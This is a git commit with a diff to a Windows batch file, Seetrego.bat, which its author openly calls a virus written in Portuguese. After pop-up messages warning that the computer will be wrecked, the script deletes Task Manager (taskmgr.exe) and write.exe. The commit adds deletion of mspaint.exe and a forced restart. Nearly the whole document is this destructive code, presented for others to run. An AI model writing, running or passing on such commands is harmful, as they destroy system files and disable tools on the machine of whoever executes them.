48a70ef8460119f6cd49b9f263da8ce0cd591387
karazal <69127362+karazal@users.noreply.github.com>
2020-08-02 21:10:37 -0300

    Update Seetrego.bat
    This is virus made in portuguese because i'm brazilian,but
    if a foreigner is going to run this virus, he will have to use the famous "Google Translate".

--- Seetrego.bat
+++ Seetrego.bat
@@ -1,7 +1,8 @@
 @echo off
-"C:\note.txt"
 msg * Esse Vírus Vai ferrar o Teu Computador,ele vai deletar o paint bloco de notas,e tbm vai deletar o gerenciador de tarefa
 msg * esse e o ultimo aviso,se você é burro reinicie o seu computador para não ser afetado.
 pause
  del "C:\Windows\System32\taskmgr.exe"
  del "C:\Windows\write.exe"
+ del "C:\Windows\System32\mspaint.exe"
+ shutdown -r -t 3 -c "iti malia,vai ferra!"
